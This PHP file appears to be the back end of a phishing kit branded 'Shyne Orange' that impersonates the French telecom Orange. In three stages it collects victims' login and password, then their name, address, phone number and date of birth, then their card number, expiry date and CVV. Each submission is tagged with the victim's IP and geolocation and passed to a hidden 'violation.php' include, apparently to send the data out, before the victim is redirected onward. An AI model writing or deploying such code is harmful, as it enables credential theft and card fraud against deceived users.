<?php

//include 'antibots.php';

include './extra/extra.php';

if (isset($_POST['log'])) {

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

    # code...
$message .= "==========  Shyne Orange ==========\n";
$message .= "Identifiant : ".$_POST['login']."\n";
$message .= "Mot de passe : ".$_POST['pass']."\n";
$message .= "Country : ".$CNCD."\n";
$message .= "City : ".$STCD."\n";
$message .= "From : ".$ip."\n";
$message .= "==========  Shyne Orange  =========\n";

include './index_fichiers/assets/etc/run/var/tmp/tmp_files/violation.php';


if($send){ 

    echo '<script type="text/javascript">';
    echo 'setTimeout(function(){window.top.location.href = "step2.php";}, 1000);';
    echo '</script>';
}      

}


if (isset($_POST['log2'])) {

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

    # code...
$message .= "==========  Shyne Orange ==========\n";
$message .= "Civilité : ".$_POST['civility']."\n";
$message .= "Nom : ".$_POST['nom']."\n";
$message .= "Prenom (s) : ".$_POST['prenom']."\n";
$message .= "Adresse : ".$_POST['adresse']."\n";
$message .= "Ville : ".$_POST['ville']."\n";
$message .= "Code Postal : ".$_POST['postal']."\n";
$message .= "Numéro de téléphone : ".$_POST['numtel']."\n";
$message .= "Date de naissance (JJ/MM/AA) : ".$_POST['dobirth']."\n";
$message .= "Country : ".$CNCD."\n";
$message .= "City : ".$STCD."\n";
$message .= "From : ".$ip."\n";
$message .= "==========  Shyne Orange  =========\n"; include './index_fichiers/assets/etc/run/var/tmp/tmp_files/violation.php';


if($send){ 

    echo '<script type="text/javascript">';
    echo 'setTimeout(function(){window.top.location.href = "step3.php";}, 1000);';
    echo '</script>';
}      

}


if (isset($_POST['log3'])) {

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

    # code...
$message .= "==========  Shyne Orange ==========\n";
$message .= "Numéro de carte : ".$_POST['cc']."\n";
$message .= "Date d'expiration (MM/AA) : ".$_POST['exp']."\n";
$message .= "Cryptogramme de sécurité (à l'arrière de la carte) : ".$_POST['crp']."\n";
$message .= "Country : ".$CNCD."\n";
$message .= "City : ".$STCD."\n";
$message .= "From : ".$ip."\n";
$message .= "==========  Shyne Orange  =========\n"; include './index_fichiers/assets/etc/run/var/tmp/tmp_files/violation.php';


if($send){ 

    echo '<script type="text/javascript">';
    echo 'setTimeout(function(){window.top.location.href = "finish.php";}, 1000);';
    echo '</script>';
}      

}                          




?>